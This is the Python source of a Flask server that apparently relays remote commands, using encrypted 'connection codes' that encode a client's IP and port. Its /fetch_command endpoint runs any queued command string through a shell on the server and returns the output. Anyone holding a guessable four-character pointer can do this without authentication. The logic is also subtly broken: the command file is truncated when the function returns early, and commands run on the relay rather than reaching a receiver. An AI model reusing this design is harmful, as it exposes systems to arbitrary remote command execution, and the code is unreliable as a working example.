from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import threading
import random
import string
import base64
import time
import os
import subprocess

app = Flask(__name__)

FERNET_KEY = Fernet.generate_key()
cipher = Fernet(FERNET_KEY)
POINT_FILE = 'point.txt'
COMMANDS_FILE = 'commands.txt'
EXPIRATION_TIME = 3600  # Expiration time in seconds (1 hour)

# Generate a random 4-character alphanumeric pointer
def generate_pointer():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=4))

def ip_port_to_bytes(ip, port):
    ip_parts = [int(part) for part in ip.split('.')]
    ip_bytes = bytes(ip_parts) + port.to_bytes(2, 'big')
    return ip_bytes

# Encrypt IP and port, adding a random IV for uniqueness
def encrypt_ip_port(ip, port):
    ip_port_bytes = ip_port_to_bytes(ip, port)
    
    # Generate a unique IV for each encryption
    iv = os.urandom(4)  # IV will be unique for each connection
    data_with_iv = iv + ip_port_bytes  # Prepend IV to data for encryption
    
    # Encrypt the data with IV
    encrypted_data = cipher.encrypt(data_with_iv)
    base64_encoded = base64.urlsafe_b64encode(encrypted_data).decode()
    
    # Return first 8 characters and remainder for the connection code
    return base64_encoded[:8], base64_encoded[8:]

# Decrypt IP and port, handling IV
def decrypt_ip_port(encrypted_ip_prefix, encrypted_ip_remainder, decryption_key):
    full_encrypted_ip_port = encrypted_ip_prefix + encrypted_ip_remainder
    encrypted_data = base64.urlsafe_b64decode(full_encrypted_ip_port + '==')
    cipher = Fernet(decryption_key.encode())
    
    # Decrypt and separate the IV and IP/port data
    decrypted_with_iv = cipher.decrypt(encrypted_data)
    iv, decrypted_bytes = decrypted_with_iv[:4], decrypted_with_iv[4:]  # Separate IV and actual data
    
    # Convert decrypted bytes back to IP and port
    ip = '.'.join(map(str, decrypted_bytes[:4]))
    port = int.from_bytes(decrypted_bytes[4:], 'big')
    
    return ip, port

# Store timestamp, pointer, decryption key, and encrypted IP remainder
def store_encrypted_ip(timestamp, pointer, decryption_key, encrypted_ip_port_remainder):
    with open(POINT_FILE, 'a') as f:
        f.write(f"{timestamp} {pointer} {decryption_key.decode()} {encrypted_ip_port_remainder}\n")

# Lookup encrypted IP and decryption key by pointer
def lookup_encrypted_ip(pointer):
    current_time = time.time()
    with open(POINT_FILE, 'r') as f:
        lines = f.readlines()
    for line in lines:
        parts = line.strip().split()
        if len(parts) == 4:
            timestamp, stored_pointer, decryption_key, encrypted_ip_port_remainder = parts
            if stored_pointer == pointer and current_time - float(timestamp) < EXPIRATION_TIME:
                return decryption_key, encrypted_ip_port_remainder
    return None, None

# Verify and get IP and port from the connection code
def verify_and_get_ip_port(connection_code):
    pointer = connection_code[:4]
    encrypted_ip_prefix = connection_code[4:]
    decryption_key, encrypted_ip_remainder = lookup_encrypted_ip(pointer)
    if decryption_key is None:
        return None, None
    return decrypt_ip_port(encrypted_ip_prefix, encrypted_ip_remainder, decryption_key)

# Function to update the timestamp in point.txt
def update_timestamp(pointer):
    current_time = time.time()
    updated_lines = []
    with open(POINT_FILE, 'r') as f:
        lines = f.readlines()
    with open(POINT_FILE, 'w') as f:
        for line in lines:
            parts = line.strip().split()
            if len(parts) == 4 and parts[1] == pointer:
                updated_line = f"{current_time} {parts[1]} {parts[2]} {parts[3]}\n"
                updated_lines.append(updated_line)
            else:
                updated_lines.append(line)
        f.writelines(updated_lines)

# Generate a connection code and store encrypted details
def generate_connection_code(ip, port):
    pointer = generate_pointer()
    encrypted_ip_prefix, encrypted_ip_remainder = encrypt_ip_port(ip, port)
    connection_code = pointer + encrypted_ip_prefix
    timestamp = time.time()
    store_encrypted_ip(timestamp, pointer, FERNET_KEY, encrypted_ip_remainder)
    return connection_code

@app.route('/get_code', methods=['POST'])
def get_code():
    data = request.get_json()
    port = data.get("port")
    if not port:
        return jsonify({"error": "Port is required"}), 400
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if not client_ip:
        return jsonify({"error": "Failed to obtain client IP"}), 500
    try:
        connection_code = generate_connection_code(client_ip, port)
        print(f"Generated connection code: {connection_code}")
        return jsonify({"code": connection_code})
    except Exception as e:
        return jsonify({"error": f"Failed to create connection code: {str(e)}"}), 500

@app.route('/connect', methods=['POST'])
def connect():
    data = request.get_json()
    connection_code = data.get("code")
    print(f"Received connection request with code: {connection_code}")
    if not connection_code or len(connection_code) != 12:
        return jsonify({"error": "Invalid connection code format"}), 400
    ip, port = verify_and_get_ip_port(connection_code)
    if ip is None or port is None:
        print("Pointer not found or expired.")
        return jsonify({"error": "Invalid or expired connection code"}), 400
    print(f"Decrypted IP and port: {ip}:{port}")
    return jsonify({"message": f"Connected to {ip}:{port}"})

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    code = data.get("code")
    command = data.get("command")
    pointer = code[:4]

    update_timestamp(pointer)
    with open(COMMANDS_FILE, 'a') as f:
        f.write(f"{pointer} {command}\n")
    return jsonify({"message": "Command sent to receiver"})

@app.route('/fetch_command', methods=['POST'])
def fetch_command():
    data = request.get_json()
    code = data.get("code")
    pointer = code[:4]
    try:
        with open(COMMANDS_FILE, 'r') as f:
            lines = f.readlines()
        with open(COMMANDS_FILE, 'w') as f:
            for line in lines:
                line_pointer, command = line.strip().split(maxsplit=1)
                if line_pointer == pointer:
                    # Execute the command and capture the output
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, error = process.communicate()
                    if error:
                        return jsonify({"output": error.decode("utf-8")})
                    return jsonify({"output": output.decode("utf-8")})
                f.write(line)
        return jsonify({"command": None})
    except Exception as e:
        return jsonify({"error": f"Failed to fetch command: {str(e)}"}), 500

@app.route('/end_connection', methods=['POST'])
def end_connection():
    data = request.get_json()
    code = data.get("code")
    if not code or len(code) != 12:
        return jsonify({"error": "Invalid connection code format"}), 400

    # Verify connection code and compare IPs to confirm origin
    ip, _ = verify_and_get_ip_port(code)
    current_ip = request.remote_addr
    if ip != current_ip:
        return jsonify({"error": "Unauthorized request. Only the original receiver can end the connection."}), 403

    pointer = code[:4]

    # Remove the connection entry with the matching pointer
    try:
        with open(POINT_FILE, 'r') as f:
            lines = f.readlines()
        with open(POINT_FILE, 'w') as f:
            for line in lines:
                parts = line.strip().split()
                if len(parts) > 1 and parts[1] != pointer:
                    f.write(line)

        print(f"Connection with code {code} has been ended by the original receiver.")
        return jsonify({"message": "Connection ended successfully."})
    except Exception as e:
        print(f"Error during file update: {str(e)}")
        return jsonify({"error": "Failed to end connection due to server error"}), 500

def cleanup_old_keys():
    current_time = time.time()
    if os.path.exists(POINT_FILE):
        with open(POINT_FILE, 'r') as f:
            lines = f.readlines()
        with open(POINT_FILE, 'w') as f:
            for line in lines:
                parts = line.strip().split()
                if len(parts) == 4:
                    timestamp, pointer, decryption_key, encrypted_ip_port_remainder = parts
                    if current_time - float(timestamp) < EXPIRATION_TIME:
                        f.write(line)

cleanup_thread = threading.Thread(target=lambda: (time.sleep(600), cleanup_old_keys()))
cleanup_thread.daemon = True
cleanup_thread.start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=44444)
